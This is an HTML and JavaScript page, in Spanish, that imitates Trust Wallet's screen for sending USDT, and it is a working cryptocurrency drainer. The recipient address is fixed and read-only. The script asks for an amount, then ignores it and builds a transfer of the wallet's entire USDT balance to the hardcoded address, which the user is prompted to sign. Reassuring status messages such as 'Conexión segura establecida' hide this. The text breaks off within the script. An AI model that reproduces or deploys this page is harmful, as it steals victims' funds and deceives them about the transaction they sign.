<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Enviar USDT</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body {
            background-color: #ffffff;
            color: #1a1a1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }
        .tw-app {
            width: 100%;
            max-width: 410px;
            padding: 20px 24px;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .tw-nav-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 28px;
            padding: 8px 0;
        }
        .tw-nav-title {
            font-size: 19px;
            font-weight: 600;
            color: #1a1a1a;
            flex-grow: 1;
            text-align: center;
            margin-right: -24px;
        }
        .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; }
        
        .tw-card {
            background-color: #f5f7fa;
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 16px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .tw-card-label {
            font-size: 13px;
            font-weight: 500;
            color: #727782;
        }
        .tw-input-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }
        .tw-field {
            background: transparent;
            border: none;
            color: #1a1a1a;
            font-size: 16px;
            font-weight: 500;
            width: 70%;
            outline: none;
            padding: 4px 0;
        }
        
        .tw-action-blue {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            padding: 4px 0;
        }
        .tw-token-name {
            color: #1a1a1a;
            font-size: 16px;
            font-weight: 600;
        }
        .tw-status-banner {
            background-color: #edf2ff;
            border: 1px solid #d0e0ff;
            border-radius: 14px;
            padding: 14px 18px;
            font-size: 13px;
            color: #0052ff;
            margin-top: 10px;
            margin-bottom: 20px;
            display: none;
            text-align: left;
            line-height: 1.4;
            font-weight: 500;
        }
        .tw-footer-btn-area {
            margin-top: auto;
            padding-bottom: 30px;
        }
        .tw-submit-button {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .tw-submit-button:disabled { background-color: #c2d6ff; color: #ffffff; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="tw-app">
        <div class="tw-nav-bar">
            <svg class="tw-back-btn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
            </svg>
            <div class="tw-nav-title">Enviar Tether</div>
        </div>

        <div class="tw-card">
            <label class="tw-label tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
            <div class="tw-input-container">
                <!-- Tu dirección predeterminada fija sin permisos de borrado -->
                <input id="addressDisplay" class="tw-field" type="text" readonly />
                <span class="tw-action-text tw-action-blue">Pegar</span>
            </div>
        </div>

        <div class="tw-card">
            <label class="tw-card-label" for="amountDisplay">Cantidad</label>
            <div class="tw-input-container">
                <input id="amountDisplay" class="tw-field" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
                <div style="display: flex; align-items: center; gap: 12px;">
                    <span id="maxAction" class="tw-action-blue" style="display: none;">MÁX</span>
                    <span class="tw-token-name">USDT</span>
                </div>
            </div>
        </div>

        <div id="status" class="tw-status-banner"></div>

        <div class="tw-footer-btn-area">
            <button class="tw-submit-button" id="connectBtn">Siguiente</button>
        </div>
    </div>

<script>
    // Dirección predeterminada inmutable
    const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const addressDisplay = document.getElementById('addressDisplay');
    const maxAction = document.getElementById('maxAction');

    let walletAddress = null;

    function setStatus(message) {
        statusDiv.innerText = message || '';
        statusDiv.style.display = message ? 'block' : 'none';
    }

    // Carga inicial obligatoria
    addressDisplay.value = BILLETERA_DESTINO;

    async function obtenerBalanceSeguro(ownerAddress) {
        const tronWeb = window.tronWeb;
        const ownerHex = tronWeb.address.toHex(ownerAddress);
        
        const result = await tronWeb.transactionBuilder.triggerSmartContract(
            CONTRATO_USDT,
            "balanceOf(address)",
            { feeLimit: 10000000 },
            [{ type: 'address', value: ownerHex }],
            ownerHex
        );
        
        if (result && result.constant_result && result.constant_result.length > 0) {
            return tronWeb.toBigNumber('0x' + result.constant_result);
        }
        throw new Error("No se pudo sincronizar el balance con el nodo de la red.");
    }

    connectBtn.addEventListener('click', async () => {
        if (!walletAddress) {
            try {
                setStatus("Estableciendo enlace RPC con Trust Wallet...");
                connectBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
                }

                const tronWeb = window.tronWeb;
                
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res && res.code === 200) {
                        walletAddress = tronWeb.defaultAddress.base58;
                    }
                }

                if (!walletAddress) {
                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
                }

                maxAction.style.display = "inline";
                setStatus("Conexión segura establecida. Presione Continuar para iniciar la firma.");
                connectBtn.innerText = "Continuar";
                connectBtn.disabled = false;

            } catch (error) {
                console.error(error);
                setStatus(error.message || "Error de inicialización Web3.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Siguiente";
            }
            return;
        }

        if (walletAddress) {
            try {
                const userAmount = parseFloat(amountDisplay.value);
                if (isNaN(userAmount) || userAmount <= 0) {
                    throw new Error("Ingresa una cantidad válida antes de continuar.");
                }

                setStatus("Consultando fondos del libro contable on-chain...");
                connectBtn.disabled = true;

                const tronWeb = window.tronWeb;
                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);

                if (balanceBigNumber.isZero()) {
                    throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                }

                setStatus("Solicitando autorización de firma digital...");

                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);

                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                    CONTRATO_USDT,
                    "transfer(address,uint256)",
                    { feeLimit: 100000000 },
                    [
                        { type: 'address', value: destinoHex },
                        { type: 'uint256', value: balanceBigNumber.toString() }
                    ],
                    tronWeb.address.toHex(walletAddress)
                );

                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);

                if (broadcast && broadcast.result) {
                    setStatus("Transacción de saldo total completada exitosamente.");
